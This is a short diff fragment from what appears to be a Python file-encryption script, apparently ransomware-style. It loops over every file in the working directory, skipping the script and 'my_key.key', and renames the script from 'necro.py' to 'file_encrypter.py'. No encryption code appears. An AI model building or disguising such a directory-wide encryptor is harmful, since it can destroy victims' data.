@@ -50,7 +50,7 @@ files = []
 
 # os.listdir() lists every file in cwd
 for file in os.listdir():
-    if file == "necro.py" or file == "my_key.key":
+    if file == "file_encrypter.py" or file == "my_key.key":
         continue
 
     # if append file() where used here, every dir
